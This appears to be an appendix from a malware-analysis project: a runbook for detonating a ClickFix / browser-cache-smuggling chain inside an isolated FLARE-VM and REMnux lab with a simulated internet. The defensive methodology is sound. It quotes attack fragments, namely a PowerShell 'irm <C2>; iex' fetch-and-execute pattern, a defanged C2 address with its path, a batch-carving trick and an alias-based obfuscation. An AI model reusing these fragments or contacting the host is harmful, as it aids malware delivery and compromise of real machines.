# Appendix G — Detonation Runbook (Isolated Lab)

> **The legitimate, teachable "run it in a protected sandbox."** This is how a malware analyst
> safely detonates the browser-cache-smuggling / ClickFix chain from this saga — in an
> **isolated, snapshotted lab with a simulated internet**, so the C2 fetch (`irm <C2>; iex`)
> is *captured but never leaves the lab*.
>
> **Read first:** this is a **methodology runbook**, not a push-button script, and it is not
> run in this repo's cloud environment (which has real network and no isolation — see
> [Appendix F](appendix-f-dynamic-analysis.md)). Do this only on hardware you own, with
> authorization, using a live sample **you** obtain from a malware feed. Nothing here fetches
> or ships a live sample.

---

## G.0 The one rule that makes it "protected"

> **The malware's outbound requests must be answered by the lab, and must never reach the real
> internet.** Everything else — snapshots, tooling, note-taking — is convenience. This one
> property (a *contained* fake internet) is what separates a detonation lab from just running
> malware on a spare PC. If you cannot guarantee it, do not detonate.

## G.1 Lab topology

Two VMs on an **isolated / host-only virtual network** with **no NAT, no bridge** to the host
LAN:

```
        ┌───────────────────────────── host-only vSwitch (NO internet) ─────────────────────────────┐
        │                                                                                            │
   ┌────┴─────────────────────┐                                   ┌───────────────────────────────┐  │
   │  VICTIM VM — FLARE-VM     │  DNS + all traffic ───────────►   │  SERVICES VM — REMnux         │  │
   │  Windows 10, detonation   │                                   │  INetSim / FakeNet-NG         │  │
   │  IP 10.0.0.10             │  ◄─── fake responses ──────────   │  IP 10.0.0.2 (gateway+DNS)    │  │
   │  gateway+DNS = 10.0.0.2   │                                   │  Wireshark capture            │  │
   └───────────────────────────┘                                   └───────────────────────────────┘  │
        │                                                                                            │
        └──────────────────────── neither VM can route to the real internet ─────────────────────────┘
```

- **Victim VM (FLARE-VM):** Windows analysis distro (Mandiant FLARE-VM) where the sample runs.
- **Services VM (REMnux):** Linux analysis distro running the **fake internet** and the capture.
- **Isolation:** host-only (or "internal") network only. Snapshot **both** VMs clean first.

> **Hard isolation checklist:** VM network = host-only/internal; host firewall blocks the
> analysis subnet; no shared clipboard/drag-drop/shared-folders left enabled during
> detonation; Wi-Fi/second NIC on the host off if you're paranoid. Verify from the victim VM
> that `ping 8.8.8.8` and a browser to a real site both **fail** before you detonate.

## G.2 Build the victim VM (FLARE-VM)

1. Fresh **Windows 10** VM (licensed, disposable). Give it 2+ vCPU, 4–8 GB RAM, 60 GB disk.
2. Install **FLARE-VM** (Mandiant) — it lays down the analysis toolset (debuggers, PE tools,
   PowerShell logging helpers, etc.).
3. **Turn on the telemetry you'll read later:**
   - **Sysmon** with a good config (e.g. SwiftOnSecurity/Olaf config) — process, network, file,
     registry events.
   - **PowerShell logging:** Script Block Logging + Module Logging + Transcription (GPO or
     registry). This is essential — the chain is PowerShell-heavy.
   - Enable **command-line auditing** (Event ID 4688 with process command line).
4. Set the VM's **gateway and DNS to the Services VM** (`10.0.0.2`).
5. Install the browsers the lure targets (Chrome/Firefox/Brave) so the cache paths exist.
6. **Snapshot: `clean-victim`.**

## G.3 Build the services VM (REMnux) — the fake internet

1. Deploy **REMnux** (Linux). NIC on the same host-only network, static IP `10.0.0.2`.
2. Choose **one** faked-internet tool:
   - **INetSim** — simulates DNS, HTTP/S, FTP, SMTP, etc. Point its `dns_default_ip` and
     bind address at `10.0.0.2`; it answers every domain and serves canned responses. Best for
     "answer everything, capture requests."
   - **FakeNet-NG** — per-process/redirection-style interception; great when you want to see
     exactly which process reached out and to reply with tailored content.
3. Start a **packet capture** on the services VM: `tcpdump -i <iface> -w detonation.pcap` (or
   Wireshark) so you record every byte the malware tries to send.
4. **Snapshot: `clean-services` (INetSim/FakeNet running).**

> Now the malware's `irm hxxp://45.39.216[.]46/velcap3d` resolves and connects to `10.0.0.2`
> and gets **the lab's** response — the request is *captured*, and the real C2 is never
> contacted. That's the containment.

## G.4 Stage the sample (no live fetch from this repo)

- Obtain the sample from a **malware feed you're authorized to use** (VirusTotal/Malshare/
  a triage export), *not* from this repository. Transfer it into the victim VM via an
  **offline** channel (read-only ISO or a one-way shared folder you disable before detonation),
  never over the network you're about to detonate on.
- Record the sample's **SHA-256** before you run it.
- For this chain specifically you need the **seeded cache file** (the `image/jpeg` that carries
  the batch/zip) present in the browser cache, plus the **ClickFix command**. Reproduce the
  delivery by loading the captured lure page from the **Services VM** (host it on INetSim), so
  the browser caches the payload exactly as in the wild.

## G.5 Instrument, then detonate

Start recording **before** you paste anything:

1. On the victim VM launch: **Procmon** (filter to the shell/PowerShell tree), **Process
   Hacker** (live process/handle view), and confirm Sysmon + PowerShell logging are on.
2. Take a pre-run **RegShot** / file-system snapshot (for a before/after diff).
3. On the services VM confirm the capture is running and INetSim/FakeNet is up.
4. **Detonate:** perform the ClickFix step (paste the one-liner into Run / the Explorer bar) —
   or run the carved `t.bat` directly. Let it run 2–5 minutes.
5. Watch live: the size-match carve (`%~zf==17635` → `%TEMP%\t.bat`), `conhost --headless`
   → hidden `powershell`, the `irm`→`iex` beacon hitting `10.0.0.2`, and the fake Cloudflare
   WinForms window rendering.

## G.6 Collect the artifacts

After detonation, from the **victim VM**:

| Artifact | Where |
|----------|-------|
| Process tree + command lines | Procmon save (`.PML`), Sysmon (Event ID 1), 4688 |
| PowerShell scripts (deobfuscated!) | Script Block Logs (Event ID 4104) — captures post-`iex` code |
| Carved payload | `%TEMP%\t.bat`, staging dirs under `%LOCALAPPDATA%`, `f_######` cache entry |
| File/registry changes | RegShot before/after diff |
| Dropped files / persistence | new scheduled tasks, Run keys, startup |
| Memory | full VM memory dump (for later Volatility analysis) |

From the **services VM**:

| Artifact | Where |
|----------|-------|
| C2 URLs/hosts actually contacted | `detonation.pcap`, INetSim/FakeNet logs |
| Requested paths (e.g. `/velcap3d`) | INetSim HTTP log |
| Data the stealer tried to exfiltrate | pcap (contained — it went to `10.0.0.2`, not the internet) |

> **Gold from this chain specifically:** PowerShell **Script Block Logging (4104)** records the
> code fetched by `irm` *after* `iex` deobfuscates it — so even though the sample hides its
> stage behind `.(get-alias *ex)`, the lab hands you the plaintext. That's the payoff of doing
> it in an instrumented lab instead of reading it statically.

## G.7 Analyze, then revert

1. Correlate: Procmon/Sysmon process tree ↔ PowerShell 4104 scripts ↔ pcap C2 hits.
2. Extract IOCs (hashes, C2 hosts, paths, dropped files, task names) and map to
   [Appendix D (ATT&CK)](appendix-d-attack-mapping.md) and detection rules in
   [Appendix B](appendix-b-detection.md).
3. **Revert both VMs to their clean snapshots.** Never reuse a detonation VM for anything else,
   and never re-enable its internet.

## G.8 Safety rules (non-negotiable)

- ✅ Host-only network with a verified **no-route-to-internet** before detonation.
- ✅ Snapshots of **both** VMs; revert after every run.
- ✅ Sample obtained from an authorized feed; SHA-256 recorded; moved in offline.
- ✅ Fake internet (INetSim/FakeNet) answering — so C2 traffic is *captured, contained*.
- ❌ Never detonate on a machine with real network access or on shared/production hardware.
- ❌ Never let the sample reach the real C2 (that aids the adversary and exposes you).
- ❌ Never do this without authorization to handle the sample.

## G.9 The zero-setup alternative

If you don't want to build a lab, **hosted sandboxes do all of the above in their own isolated
infrastructure** and hand back the behavior report (free tiers exist): **ANY.RUN**,
**Joe Sandbox**, **Hybrid Analysis**, **VirusTotal**. Submit the sample/URL and read the
report — that's the source behind [Appendix F](appendix-f-dynamic-analysis.md).

---

*Why this is the "protected sandbox" and this repo's container is not:* here the C2 request is
answered by **INetSim on `10.0.0.2`, inside a network with no route out**. In a general cloud
container the same request would travel to the **real** C2. Same command, opposite blast radius.

*Cross-references:* static file analysis → [Appendix C](appendix-c-the-files.md) /
[Appendix E](appendix-e-frames.md); observed behavior → [Appendix F](appendix-f-dynamic-analysis.md);
detection → [Appendix B](appendix-b-detection.md); ATT&CK → [Appendix D](appendix-d-attack-mapping.md).
